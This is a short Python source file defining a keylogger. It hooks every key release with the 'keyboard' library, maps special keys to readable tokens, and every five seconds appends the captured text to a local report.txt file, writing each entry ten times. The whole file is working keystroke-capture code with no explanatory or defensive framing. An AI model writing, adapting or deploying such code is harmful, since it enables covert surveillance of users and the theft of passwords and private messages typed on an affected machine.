import keyboard
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 5
# in seconds


class keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def record(self, message):
        f = open("report.txt", "a+")
        for i in range(10):
          f.write("\n" + message)
        f.close()

    def report(self):
        if self.log:
            self.record(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
